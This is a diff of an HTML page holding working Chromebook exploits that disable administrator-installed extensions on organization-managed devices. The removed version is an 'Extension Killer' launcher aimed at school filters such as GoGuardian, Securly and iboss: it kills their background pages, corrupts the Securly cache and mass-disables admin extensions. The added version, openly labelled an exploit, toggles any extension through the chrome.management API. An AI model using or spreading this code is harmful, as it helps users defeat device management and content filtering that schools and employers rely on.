@@ -6,227 +6,120 @@
 <body>
 
 <script>
-    function aboutBlankPage(url){
-  opener.chrome.tabs.query({url:url},(x)=>{
-    opener.chrome.tabs.update(x[0].id,{url:"about:blank"});
-  })
-};
-
-function get(id){
-  const el = window.document.getElementById(id);
-  if (!el) {
-    alert("AAA");
-  }
-  return el;
-};
-
-doc = window.document;
-
-window.document.body.innerHTML = `
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Cutive+Mono&family=Open+Sans:wght@300&display=swap');
-  
-    html, body {
-      height: 100%;
-      width: 100%;
-      text-align: center;
-    }
+    /*
+This code will exploit ChromeBook and allow you to disable extentions on organization device.
+Author: sharmanhall
+Version: 1.0
+Date: 11/21/2022
+Credits: https://compactcow.com/ltbeef/
+*/
 
 
-    
-    h1, h2 {
-      font-family: "Cutive Mono", sans-serif;
-    }
-    p {
-      font-size: 16;
-      font-family: "Open Sans", sans-serif;
-    }
-    button {
-      outline: 0;
-      align-items: center;
-      background-color: #FFFFFF;
-      border: 1px solid rgba(0, 0, 0, 0.1);
-      border-radius: .25rem;
-      box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
-      box-sizing: border-box;
-      color: rgba(0, 0, 0, 0.85);
-      cursor: pointer;
-      display: inline-flex;
-      font-family: "Open Sans", sans-serif;
-      font-size: 16px;
-      font-weight: 600;
-      justify-content: center;
-      line-height: 1.25;
-      margin: 0;
-      min-height: 3rem;
-      padding: calc(.875rem - 1px) calc(1.5rem - 1px);
-      position: relative;
-      text-decoration: none;
-      transition: all 250ms;
-      user-select: none;
-      -webkit-user-select: none;
-      touch-action: manipulation;
-      vertical-align: baseline;
-      width: auto;
-      color: black;
-    }
-
-    #code {
-      background-color: lightgray; border-radius: 5px;
-    } /*span element*/
-    
-    button:hover,
-    button:focus {
-      border-color: rgba(0, 0, 0, 0.15);
-      box-shadow: rgba(0, 0, 0, 0.1) 0 4px 12px;
-      color: rgba(0, 0, 0, 0.65);
-    }
-    
-    button:hover {
-      transform: translateY(-1px);
-    }
-    
-    button:active {
-      background-color: #F0F0F1;
-      border-color: rgba(0, 0, 0, 0.15);
-      box-shadow: rgba(0, 0, 0, 0.06) 0 2px 4px;
-      color: rgba(0, 0, 0, 0.65);
-      transform: translateY(0);
-    }
-    input {
-      outline: 0;
-      align-items: center;
-      background-color: #FFFFFF;
-      border: 1px solid rgba(0, 0, 0, 0.1);
-      border-radius: .25rem;
-      box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
-      box-sizing: border-box;
-      color: rgba(0, 0, 0, 0.85);
-      display: inline-flex;
-      font-family: "Open Sans", sans-serif;
-      font-size: 16px;
-      font-weight: 600;
-      justify-content: center;
-      line-height: 1.25;
-      margin: 0;
-      min-height: 3rem;
-      padding: calc(.875rem - 1px) calc(1.5rem - 1px);
-      position: relative;
-      text-decoration: none;
-      user-select: none;
-      -webkit-user-select: none;
-      touch-action: manipulation;
-      vertical-align: baseline;
-      width: auto;
-    }
-    
-    #eee {
-      cursor: pointer;
-      text-decoration: underline; 
-      color: #242526;
-    }
-    
-    #links {
-      display: none;
-      font-family: 'Open Sans', sans-serif; 
-      color: gray;
-    }
-
-    a {
-      color: gray;
-      text-decoration: none;
-    }
-
-    #container {
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      position: fixed;
-      white-space: nowrap;
-    }
-    
-  </style>
-  
-  <div id="container">
-    <center><h1>Point Blank Swap Launcher</h1></center>
-
-    <h2>―――――― Extension Killer ――――――</h2>
-    <p><span id='eee'>Extension links</span>▼</p>
-    <div id='links'>
-      <a href='https://tinyurl.com/goofguardian'>goguardian</a>  &bull; 
-      <a href='https://tinyurl.com/goofcurly'>securly</a>  &bull; 
-      <a href='https://tinyurl.com/goofclassroom'>securly classroom</a>  &bull; 
-      <a href='https://tinyurl.com/goofumbrella'>cisco umbrella</a>  &bull; 
-      <a href='https://tinyurl.com/goofsi'>blocksi</a>  &bull; 
-      <a href='https://tinyurl.com/goofboss'>iboss</a>
-      <br>
-    </div>
-    <p>After visiting link:</p>
-    <button id='cachekill'>[Securly only] Hard Kill (cache)</button>
-    <button id='hardkill'>Soft kill extension</button><br>
-    <button id='hardkillrev'>Revert Hard Kill</button>
-    
-    <p>To enable from soft kill, go to chrome-extension://{id here}/_generated_background_page.html</p>
-    <h2>――― Change tab URL (about:blank) ―――</h2>
-    <input id='url'>
-    <button  id='change'>Change tabs (Useless)</button>
-    <p id='error'></p>
-    <button  id='reload'>Reload extension (Useless)</button>
-    <br>
-    <p><i>Expoit made by SprinkzMC#8421, Launcher made by NitrogenDioxide#2553</i></p>
-  </div>
-`;
-try {
-console.log(get('hardkill'));
-get('hardkill').addEventListener('click', function() {try{opener.chrome.extension.getBackgroundPage().close();alert('Killed background process')}catch(e){alert(e);}}, false);
-} catch(e) {
-    alert(e);
+function m() {
+    var r='',c='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    for ( var i = 0; i < 5; i++ ) {
+      r += c.charAt(Math.floor(Math.random() * 36));
+   }
+   return r;
 }
-get('change').addEventListener('click', function(){
-    const url = get('url').value;
-    aboutBlankPage(url);
-}, false);
 
-get('cachekill').addEventListener('click', function (){
-    if (confirm("Reverting hard kill sometimes can fail. Use with caution.\nPress Ok to continue, cancel to cancel")){
-    localStorage.cluster='UNKNOWN_SCHOOL, 999999999999999999999999999';
-    opener.chrome.extension.getBackgroundPage().location.reload();
-    alert('Cache changed');}
-}, false);
+if (location.host != "chrome.google.com" || !location.pathname.startsWith("/webstore")) {
+    location.href = "https://chrome.google.com/webstore" + m();
+}
 
-get('hardkillrev').addEventListener('click', function (){
-    localStorage.cluster='UNKNOWN_SCHOOL,0';
-    opener.chrome.runtime.reload();
-    alert('Reverted cache');
-}, false);
+document.head.innerHTML = `
+<style>
+tr:nth-child(even){background-color: #f2f2f2;}
+tr:hover {background-color: #ddd;}
+td, th {
+  border: 1px solid #ddd;
+  padding: 8px;
+  font-family: Arial, Helvetica, sans-serif;
+  border-collapse: collapse;
+}
+.switch {
+  position: relative;
+  display: inline-block;
+  width: 40px;
+  height: 23px;
+}
+.switch input {
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
+.slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: #ccc;
+  -webkit-transition: .4s;
+  transition: .4s;
+}
+.slider:before {
+  position: absolute;
+  content: "";
+  height: 17px;
+  width: 17px;
+  left: 3px;
+  bottom: 3px;
+  background-color: white;
+  -webkit-transition: .4s;
+  transition: .4s;
+}
+input:checked + .slider {
+  background-color: #2196F3;
+}
+input:focus + .slider {
+  box-shadow: 0 0 1px #2196F3;
+}
+input:checked + .slider:before {
+  -webkit-transform: translateX(17px);
+  -ms-transform: translateX(17px);
+  transform: translateX(17px);
+}
+/* Rounded sliders */
+.slider.round {
+  border-radius: 23px;
+}
+.slider.round:before {
+  border-radius: 50%;
+}
+</style>
+`;
+document.body = document.createElement("body");
 
-get('reload').addEventListener('click', function(){
-    try {
-        opener.chrome.extension.getBackgroundPage().location.reload();
-        alert('Reloaded');
-    } catch(e) {
-        alert('Failed to reload: '+e);
-    }
-}, false);
+document.toggleFunction = function(id){
+    var clickedRow = document.getElementById(id);
+    chrome.management.setEnabled(id, clickedRow.children[0].children[0].children[0].checked);
+};
 
-get('eee').addEventListener('click', function(){
-    const x = get('links');
-  
-    if (x.style.display == "none") {
-      x.style.display = "block";
-    } else {
-      x.style.display = "none";
-    }
-}, false);
-// Swamp:
-    var swamp = document.createElement("object");
-  swamp.style = "position:fixed;height:100%;width:100%;top:0;left:0;user-select:none";
-  swamp.data =+ "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/swamp" || "#";
-  swamp.browserProxyImpl_domain = "chrome-extension:././https://" + document.domain;
-  //swamp.addEventListener("load", (e)=>{fetch('https://ssl.google-analytics.com/swamp.js').then(e=>e.text()).then(e=>{window.document.body.innerHTML = e})});
-    swamp.addEventListener("load", (e)=>{try{chrome.management.getAll(a => {a = a.filter(e => e.installType === 'admin'); a.forEach(e => chrome.management.setEnabled(e.id,!1)); window.document.body.innerHTML = 'disabled ' + a.length + ' extensions'}}catch(e){window.document.body.innerHTML = e})});
-  document.body.appendChild(swamp);
-    
+document.newBodyData = "<table>"
+console.log(document.newBodyData)
+document.newBodyData += ""
+
+
+chrome.management.getAll(function(){
+    arguments[0].forEach(function(extension){
+        document.newBodyData += "<tr id="+extension.id+">"
+        /*
+        if ("icons" in extension) {
+            document.newBodyData += "<td><img src='"+extension.icons[0]['url']+"'/></td>"
+        }    
+        */
+        document.newBodyData += "<td><label class='switch'><input type='checkbox' " + (extension.enabled ? "checked" : "") + " onclick=\"toggleFunction('"+extension.id+"')\"><span class='slider round'></span></label></td>"
+        document.newBodyData += "<td>"+extension.name+"</td>"
+        document.newBodyData += "<td>"+extension.id+"</td>"
+        document.newBodyData += "<td>"+extension.installType+"</td>"
+        
+        document.newBodyData += "</tr>"
+    });
+    document.newBodyData += "</table>"
+    document.body.innerHTML = document.newBodyData;
+})
   </script>
 </body>
 </html>
